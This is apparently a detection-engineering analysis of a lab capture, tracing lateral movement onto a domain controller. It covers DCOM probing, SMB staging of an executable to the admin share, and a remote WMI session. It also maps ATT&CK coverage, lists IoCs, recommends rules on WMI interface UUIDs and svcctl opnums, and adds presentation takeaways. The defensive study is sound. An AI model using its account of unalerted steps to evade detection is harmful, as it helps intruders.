| 35 | 13:20:25.529 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.9 KB↑ 2.0 KB↓ | — | TGS-REQ lab.admin → host/suricon-dc.lab.local |
| 36 | 13:20:25.538 | 10.137.2.33 | 10.137.2.62 | 50718 | TCP | 14 | — | — | DCOM→CIMOM: 00000143, IWbemService d4781cd6, IWbemLocator 9f6c78ef, f309ad18, 9556dc99 op6 |
| 37 | 13:20:34.236 | 10.137.2.33 | 10.137.2.62 | 123 | ntp | 1 | 162 B↑ 162 B↓ | — | — |
| 38 | 13:20:39.346 | 10.137.2.62 | 10.137.2.7 | 443 | TCP | 1 | — | — | TLS 1.2, CN=localhost, no SNI; JA3 43016d7f7f93…, JA4 t12i180600_4b22cbed5bed_2dae41c691ec |
| 39 | 13:21:00.037 | 10.137.2.33 | 10.137.2.62 | 53 | dns | 4 | 148 B↑ 352 B↓ | — | A login.live.com |
| 40 | 13:21:01.602 | 10.137.2.33 | 10.137.2.62 | 53 | TCP | 5 | — | — | A watson.events.data.microsoft.com; A settings-win.data.microsoft.com |

---

## Timeline

Relevant flows: 1–10, 12–36 (33 flows). Background: 11, 37–40 (7 flows). All activity originates from 10.137.2.33 against 10.137.2.62, which acts as KDC (88), DNS (53), NTP (123), RPC (135) and SMB (445) server — i.e. the DC in this capture.

### Phase 1 — RPC service control / DCOM activation against 10.137.2.62 (13:19:27–13:20:02)

Flows 1, 2, 3, 4 (wave 1, 13:19:27.3–13:19:28.5) and 12, 13, 14, 15 (wave 2, 13:20:00.9–13:20:02.1), side effects 5–10, 16–20.

Two near-identical waves ~33 s apart. Each wave opens a DCOM activation session on RPC 135 via the IActivation interface (e1af8308, opnum 3 — flows 1, 3, 12, 14) and then talks to dynamic RPC port 49682 with two interfaces: the service control manager (svcctl, e3514235) issuing OpenSCManager (opnum 12) plus opnums 0/1 (flows 4, 15), and an unlabeled interface 12345778-1234-abcd-ef00-0123456789ab v0.0 with repeated opnum 77 requests (flows 2, 13). The repeated OpenSCManager pattern across two waves reads as a tool probing/controlling remote services. No alerts fired on any of these flows — the svcctl and activation steps are anchored solely by NSM, and the opnum 77 interface is opaque (gap).

Kerberos side effect: lab.user obtains a TGT (AS-REP on flows 9, 19 after KRB_ERRORs — the client first used the short realm `LAB` before `LAB.LOCAL`), then requests service tickets for `suricon-ws1\$` and `host/suricon-ws1.lab.local` (flows 6, 10, 20) — ws1 principals while the RPC traffic targets .62 (see Notes).

### Phase 2 — SMB staging to C\$ as lab.admin (13:20:21–13:20:37)

Flow 21, auth side effects 22–25.

NSM records the full admin-share session on 10.137.2.62:445: lab.admin authenticates via Kerberos (TGT on flow 23, TGS for `cifs/suricon-dc.lab.local` on flow 24), SMB1→SMB2 negotiate, SESSION_SETUP, TREE_CONNECT to `\\suricon-dc.lab.local\C\$`, IOCTL capability queries, then CREATE of the `Windows\Tasks` directory and CREATE + WRITE of `Windows\Tasks\DiskOptimizationV2_5537.exe` (800,768 bytes; the `fileinfo` event on the same flow carries sha256 `3373e3ab99bf29b65ee41ffd1a89685ac439638b6839e38e6bc4e49c4cb2e952`). Three further CREATE/CLOSE cycles on the exe at 13:20:25 (open-for-execution/verification pattern), then two TREE_DISCONNECTs at 13:20:32.5 and 13:20:37.9.

Alerts 2025701 (ET INFO SMB2 NT Create AndX Request For an Executable File) ×3 and 2025699 (ET INFO SMB Executable File Transfer) ×2 fired on flow 21 — low-tier labels for what the SMB/fileinfo dissection already records; they corroborate but do not drive the detection. No `flow` record for this session exists in the window, so canonical byte counts/state are unavailable (the alerts' partial snapshots show ~811 KB to-server).

### Phase 3 — Remote WMI/DCOM session on 10.137.2.62 (13:20:25.2–13:20:25.7)

Flows 27, 31, 32, 36; side effects 26, 28–30, 33–35.

Immediately after the file write, .33 resolves `A suricon-dc.lab.local` (flow 26), then: two BINDs to 135 with the MSS interface 99fcfec4 (flows 27, 32), an endpoint-mapper lookup (000001a0, opnum 4) on 135 (flow 31) that yields dynamic port 50718, and a direct DCOM session to .62:50718 (flow 36) using the standard RPC interface 00000143 (opnums 3/5/6) together with the WMI provider interfaces IWbemLocator (9f6c78ef-fce5-42fa-abea-3e7df91921dc, opnum 3), IWbemService (d4781cd6-e5d3-44df-ad94-930efe48a887, opnum 3), f309ad18 (opnums 3/6) and 9556dc99 (opnum 6). This endpoint-mapper-then-dynamic-port interface set is the remote WMI (CIMOM) session-establishment pattern. Kerberos side effect: lab.admin TGTs (flows 29, 34) plus TGS for `RPCSS/suricon-dc.lab.local` (flow 30) and `host/suricon-dc.lab.local` (flow 35) — RPC-over-Kerberos authentication for the RPCSS/DCOM leg. No alerts fired on any of flows 27–36.

### Background

- Row 11 (A `wdcp.microsoft.com`, 13:19:29): client-side lookup during phase 1; no kill-chain tie.
- Row 37 (NTP .33→.62:123, exchange at flow start 13:20:02.8, record emitted 13:20:34.2): routine clock sync to the DC; no step tie.
- Row 38 (TLS .62→.7:443, 13:20:39.3, CN=localhost, no SNI, JA3 `43016d7f7f9336b17c884650d0d2545d`): the only in-scope flow on the .62→.7 pair; 13 s after the WMI phase. Could be target-side post-activity, but CN=localhost points at a local/lab service and no observable tie to the kill chain exists in this window — background, flagged for follow-up in Notes.
- Row 39 (A `login.live.com`, 13:21:00) and row 40 (A `watson.events.data.microsoft.com`, `settings-win.data.microsoft.com`, 13:21:01–13:21:19): Windows account/telemetry lookups; routine.

---

## Verdict

### T1021.002 — Remote Services: SMB/Windows admin shares

- **NSM evidence**: flow 21 — SMB2 session to .62:445 as lab.admin (TGS `cifs/suricon-dc.lab.local`, flow 24): TREE_CONNECT `\\suricon-dc.lab.local\C\$`, CREATE of `Windows\Tasks`, CREATE+WRITE of `Windows\Tasks\DiskOptimizationV2_5537.exe`, `fileinfo` with sha256 `3373e3ab…` / 800,768 B, follow-on open/close cycles, TREE_DISCONNECT. Preceding `A suricon-dc.lab.local` lookup (flow 26).
- **Alert enrichment**: 2025701 ×3 and 2025699 ×2 (ET INFO, low tier) on flow 21 label the executable create/transfer; corroborative only.
- **Gaps**: no `flow` record for the SMB session in the window (canonical bytes/state unavailable); no SMB-side execution of the staged file (the phase-1 svcctl activity on .62:49682 stops at OpenSCManager and is not tied to this file).
- **Verdict**: `covered`

### T1047 — WMI

- **NSM evidence**: flow 31 — endpoint-mapper lookup (000001a0, opnum 4) on 135 resolving dynamic port 50718; flow 36 — DCOM session to .62:50718 binding IWbemLocator (9f6c78ef), IWbemService (d4781cd6), f309ad18, 9556dc99 (op6) plus standard RPC 00000143; flows 27/32 — MSS (99fcfec4) binds on 135; auth side effects flows 28–30, 33–35 (lab.admin TGT + TGS for `RPCSS/suricon-dc.lab.local` and `host/suricon-dc.lab.local`).
- **Alert enrichment**: none — no alerts fired on any DCOM/WMI flow; NSM protocol records are the sole anchor.
- **Gaps**: the WMI method invocation (e.g. Win32_Process Create) is opaque — dcerpc dissection yields only UUID/opnum; the repeated opnum 77 on unlabeled interface 12345778 (flows 2, 13) cannot be attributed to WMI or any known interface; no target-side process/file activity observed on .62 after the session to confirm execution.
- **Verdict**: `partial`

---

## Notes

**IoCs**
- `DiskOptimizationV2_5537.exe` staged at `C:\Windows\Tasks\` on 10.137.2.62 — sha256 `3373e3ab99bf29b65ee41ffd1a89685ac439638b6839e38e6bc4e49c4cb2e952`, 800,768 B.
- RPC dynamic ports reused by the tool: 49682 (svcctl + 12345778 interface, both waves) and 50718 (WMI DCOM).
- DCERPC interface `12345778-1234-abcd-ef00-0123456789ab` v0.0, opnum 77 — not a known/standard interface; treat as tool signature.
- TLS .62→.7:443: JA3 `43016d7f7f9336b17c884650d0d2545d`, JA4 `t12i180600_4b22cbed5bed_2dae41c691ec`, CN=localhost.

**Anomalies**
- Principal/IP mismatch: during phase 1 the client requests service tickets for `suricon-ws1\$` / `host/suricon-ws1.lab.local` while targeting .62; phases 2–3 use `suricon-dc.lab.local` service principals against the same .62, which also serves KDC/DNS/NTP. If .62 = suricon-dc, the ws1 tickets are out of scope for the target and warrant verification; if .62 = suricon-ws1, the SMB share name is mislabeled. Either way, scope-check which host .62/.7 actually are before acting.
- `KRB_ERROR` on short-realm AS-REQs (`krbtgt/LAB`) preceding success on `LAB.LOCAL` — scripted client with a hardcoded short realm.
- Dataset extends to 13:21:32, past the recorded end_time (13:21:04); post-cutoff events are flow terminations and routine DNS only — no verdict impact.

**Recommendations**
- Highlight rule: RPCSS/DCOM activation involving `9f6c78ef-fce5-42fa-abea-3e7df91921dc` (IWbemLocator) or `d4781cd6-e5d3-44df-ad94-930efe48a887` (IWbemService) from a remote host — would have labeled the T1047 session-establishment step (flows 31/36) that currently has zero alert coverage.
- Label or investigate the `12345778` interface / opnum 77 to close the phase-1 gap.
- Alert on svcctl CreateService/StartService opnums (26/31) to non-local hosts; observed traffic stops at OpenSCManager (op12), so no service creation was visible over SCM in this window.
- Follow up flow 38: pull target-side process/audit data on .62 around 13:20:39 to determine whether the WMI payload produced the outbound TLS to .7.
- Re-query for `flow` records of 1561827336736660 (SMB), 404021396347639 (WMI DCOM), 400572950246494 (endpoint mapper), 2160156539477089 (TLS) once the capture closes, to confirm byte totals and session state.

## Takeaways

* Generating findings is not the end, real detection engineering just begins
    * workflow loops, easy to lose track
* AI version 90-10% split
    * fog of war, calling BS is critical
    * law of the wasteland is still there
    * easy to fall into coding agent loop
    * make it boring
    * deterministic scripts with live feedback still win
* App-layer behavior, lost telemetry
    * midstream pickup
    * `app-layer.protocols.smb.max-tx`
* Discussion point - how to share the output
    * even small corpus is a wasteful commit
    * presentation repo is a snapshot

## Fin